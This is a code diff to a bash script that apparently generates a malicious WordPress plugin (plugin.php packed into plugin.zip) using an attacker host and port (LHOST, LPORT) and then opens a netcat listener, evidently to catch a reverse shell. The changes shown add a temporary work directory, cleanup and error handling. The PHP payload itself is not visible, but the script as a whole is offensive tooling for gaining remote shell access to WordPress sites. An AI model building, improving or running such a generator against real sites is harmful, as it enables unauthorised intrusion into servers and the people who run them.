@@ -46,7 +46,7 @@ function attackerInfo(){
 function createPlugin(){
   echo -e " ❗ Creating   │ plugin.php${END}"
 
-/bin/cat <<EOF > plugin.php
+/bin/cat <<EOF > "${WORKDIR}/plugin.php"
 <?php
 
 /**
@@ -65,8 +65,14 @@ EOF
 }
 
 function compressPlugin(){
-  zip plugin.zip plugin.php >/dev/null 2>&1
-  rm -rf plugin.php
+  if ! (cd "${WORKDIR}" && zip -q plugin.zip plugin.php); then
+    echo "Error: could not create plugin.zip" >&2
+    return 1
+  fi
+  if ! ln "${WORKDIR}/plugin.zip" plugin.zip; then
+    echo "Error: could not create plugin.zip; the destination may already exist" >&2
+    return 1
+  fi
   echo -e " 🗄️ Compress   │ php > zip ${END}"
   echo -e " 💥 Generated  │ ${GREEN}plugin.zip${END}"
 }
@@ -87,9 +93,11 @@ done
 if [[ -n "${LHOST}" && -n "${LPORT}" ]]; then
   banner
   check
-  createPlugin
+  WORKDIR=$(mktemp -d "./.wpgen.XXXXXXXX") || exit 1
+  trap 'rm -rf -- "${WORKDIR}"' EXIT
+  createPlugin || exit 1
   attackerInfo
-  compressPlugin
+  compressPlugin || exit 1
   listenerNetcat
 else
   banner
